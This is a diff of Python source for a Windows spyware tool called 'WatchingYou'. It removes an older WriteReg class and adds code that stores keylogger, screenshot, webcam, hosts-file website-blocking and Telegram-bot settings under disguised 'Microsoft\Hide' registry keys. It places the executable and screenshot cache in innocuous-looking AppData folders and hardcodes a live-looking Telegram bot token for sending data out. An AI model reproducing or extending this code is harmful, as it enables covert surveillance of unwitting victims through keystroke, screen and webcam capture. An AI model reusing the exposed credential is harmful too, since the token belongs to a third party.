@@ -681,77 +681,11 @@ class WebCam_IA:
         init(num)
 
 
-class WriteReg:
-    class Keylogger:
-        def __init__(self, pathReg, active, limit):
-            self.__path = pathReg
-            self.active = active
-            self.limit = limit
-
-        def set_values(self):
-            reg = WinRegistry(self.__path)
-            reg.set_value_DWORD('active', self.active)
-            reg.set_value_DWORD('limit', self.limit)
-            print(
-                f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
-
-    class Screenshot:
-        def __init__(self, pathReg, active, intervalSeconds, cache_path):
-            self.__path = pathReg
-            self.value_active = active
-            self.intervalSeconds = intervalSeconds
-            self.cache_path = cache_path
-
-        def set_values(self):
-            reg = WinRegistry(self.__path)
-            reg.set_value_DWORD('active', self.value_active)
-            reg.set_value_DWORD('interval_seconds', self.intervalSeconds)
-            reg.set_value_ExpandableString('path', self.cache_path)
-            print(
-                f"{bcolors.BOLD}{bcolors.OKBLUE}Screenshot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
-
-    class TelegramBot:
-        def __init__(self, path_registry, id, token):
-            self.__path = path_registry
-            self.id = id  # Array # Saltos de linea
-            self.token = token
-
-        def set_values(self):
-            reg = WinRegistry(self.__path)
-            reg.set_value_MultiString('id', self.id)
-            reg.set_value_String('token', self.token)
-            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
-                  f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
-
-    class Trojan:
-        def __init__(self, path_registry, debug, delay, path_software, name_software, username):
-            self.__path_registry = path_registry
-            self.__debug = debug  # not enabled this version
-            self.__delay = delay  # not enable this version
-            self.__path_software = path_software
-            self.__name_software = name_software
-            self.__path_complete = self.__path_software + '\\' + self.__name_software
-            self.__user = username
-
-        def set_values(self):
-            reg = WinRegistry(self.__path_registry)
-            reg.set_value_DWORD('debug', self.__debug)
-            reg.set_value_DWORD('delay', self.__delay)
-            reg.set_value_ExpandableString('sub_path', self.__path_software)
-            reg.set_value_ExpandableString('name_software', self.__name_software)
-            reg.set_value_ExpandableString('path', self.__path_complete)
-            reg.set_value_String('username', self.__user)
-
-            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
-                  f"Trojan: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
-
-
 class WatchingYou:
     def write_reg_init(self):
         if self.__check_reg() == False:
             ## Escrbiir en el registro
             pass
-
 
     def check_id(self, fullname, chat_id):
         token = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token'))
@@ -765,52 +699,137 @@ class WatchingYou:
             except:
                 print("Was there mistake in ID: " + str(id) + " or Token: " + str(token))
                 return False
+
     def __check_reg(self):
         return WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname')
 
     def __write_id(self, fullname, chat_id):
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').set_value_String('fullname', fullname)
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').set_value_MultiString('id',chat_id)
+
     def write_reg_complete_init(self):
-        """
-        WriteReg().Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
-                  active=1,
-                  limit=150
-                  ).set_values()
-        WriteReg().Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
-                   active=1,
-                   intervalSeconds=15,
-                   cache_path='C:\\Users\\' + str(
-                       os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
-                   ).set_values()
-        WriteReg().TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
-                    id=["-1001322369309"],
-                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM",
-                    ).set_values()
-        WriteReg().Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
-                        debug=0,
-                        delay=0,
-                        path_software='C:\\Users\\' + str(
-                            os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp',
-                        name_software='SpyTrojan.exe',
-                        username=str(os.getlogin())
-                        )
-        """
+
+        def write_keylogger_reg():
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger')
+            reg.set_value_DWORD('active', 1)
+            reg.set_value_DWORD('limit', 15)
+            print(
+                f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+
+        def write_screenshot_reg():
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot')
+            reg.set_value_DWORD('active', 1)
+            reg.set_value_DWORD('interval_seconds', 10)
+            reg.set_value_ExpandableString('path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp')
+            print(
+                f"{bcolors.BOLD}{bcolors.OKBLUE}Screenshot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+        def write_telegram_bot_reg():
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot')
+            reg.set_value_MultiString('id', "")
+            reg.set_value_String('token', "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM")
+            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
+                  f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+        def write_info_reg():
+
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide')
+            reg.set_value_ExpandableString('sub_path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp')
+            reg.set_value_ExpandableString('name_software','WatchingYou.exe')
+            reg.set_value_ExpandableString('path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp' +'\\'+'WatchingYou.exe')
+            reg.set_value_String('username',str(os.getlogin()) )
+
+            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
+                  f"info: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+        def write_website_reg():
+
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebsiteBlock')
+            reg.set_value_DWORD('active', 1)
+            reg.set_value_MultiString('host_original',
+                                      ["# Copyright (c) 1993-2009 Microsoft Corp."
+                                          , "#"
+                                          , "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows."
+                                          , "#"
+                                          , "# This file contains the mappings of IP addresses to host names. Each"
+                                          , "# entry should be kept on an individual line. The IP address should"
+                                          , "# be placed in the first column followed by the corresponding host name."
+                                          , "# The IP address and the host name should be separated by at least one"
+                                          , "# space."
+                                          , "#"
+                                          , "# Additionally, comments (such as these) may be inserted on individual"
+                                          , "# lines or following the machine name denoted by a '#' symbol."
+                                          , "#"
+                                          , "# For example:"
+                                          , "#"
+                                          , "#      102.54.94.97     rhino.acme.com          # source server"
+                                          , "#       38.25.63.10     x.acme.com              # x client host"
+                                          , "# localhost name resolution is handled within DNS itself."
+                                          , "#	127.0.0.1       localhost"
+                                          , "#	::1             localhost"])
+
+            reg.set_value_MultiString('list_webs',
+                                      ["www.google.com"
+                                          , "www.wikipedia.com"
+                                          , "www.bing.com"
+                                          , "www.es.yahoo.com"
+                                          , "www.altavista.com"
+                                          , "www.ask.com"
+                                          , "www.gigablast.com"
+                                          , "www.excite.com"
+                                          , "www.lycos.com"
+                                          , "www.wolframalpha.com"
+                                          , "www.quandl.com"
+                                          , "www.factbites.com"
+                                          , "ww.nationmaster.com"
+                                          , "www.facebook.com"
+                                          , "www.Instagram.com"
+                                          , "www.twiter.com"
+                                          , "www.tiktok.com"
+                                          , "www.youtube.com"
+                                          , "www.wechat.com"
+                                          , "www.linkedln.com"
+                                          , "www.skype.com"
+                                          , "www.snapchat.com"
+                                          , "www.pinterest.com"
+                                          , "www.whatsapp.com"
+                                          , "www.reddit.com"])
+
+            reg.set_value_String('path', r'C:\Windows\System32\drivers\etc\hosts')
+
+            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
+                  f"info: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
+        def webcam_info_reg():
+            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebCam')
+            reg.set_value_DWORD('active', 1)
+            reg.set_value_String('extension', '.mp4')
+            reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\webcam')
+
+        write_website_reg()
+        write_keylogger_reg()
+        write_screenshot_reg()
+        write_telegram_bot_reg()
+        write_info_reg()
+        webcam_info_reg()
+
+    def __active_or_disable(self, value):
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger').set_value_DWORD('active',  value)
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').set_value_DWORD('active',  value)
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebsiteBlock').set_value_DWORD('active',  value)
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebCam').set_value_DWORD('active', value)
+
     def active(self):
-        #WriteReg().
-        pass
+        self.__active_or_disable(1)
 
-    def desactive(self):
-        pass
-
+    def disabled(self):
+        self.__active_or_disable(0)
 
 
 
 if __name__ == '__main__':
-
+    
     if WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname') == False:
         print('no existe, crear datos en el registro')
-    else :
+        WatchingYou().write_reg_complete_init()
+
+    else:
         print('si se encontró el username ')
 
     folders = [
@@ -822,8 +841,8 @@ if __name__ == '__main__':
     for f in folders:
         Util().delete_folder(f)  # Remove foldes and files // Cache
         Util().create_folder(f)  # Create folders for cache
-
     """
+    '''
     time.sleep(1)
     # Eliminar todas las carpetas
     threading.Thread(target=Keylogger().listen_key).start()
@@ -831,7 +850,7 @@ if __name__ == '__main__':
 
     # Verifica permisos de admistrador: Administrador
     WebCam_IA().start()
-    """
+    '''
 
     eel.init('web')     # Nombre de la carpeta
 
@@ -855,7 +874,7 @@ if __name__ == '__main__':
     def start___():  # Inicia todo el proceso
         print('continuar')
 
-        """
+        '''
         #threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
         threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
         print("PATH Screenshot: " )
@@ -863,7 +882,7 @@ if __name__ == '__main__':
         threading.Thread(target=Keylogger().listen_key).start()
 
         WebCam_IA().start()
-        """
+        '''
 
 
         # Crea Registros
@@ -894,5 +913,6 @@ if __name__ == '__main__':
 
 
     eel.start('index.html',  size=(950, 600))
+    
 
-
+    """
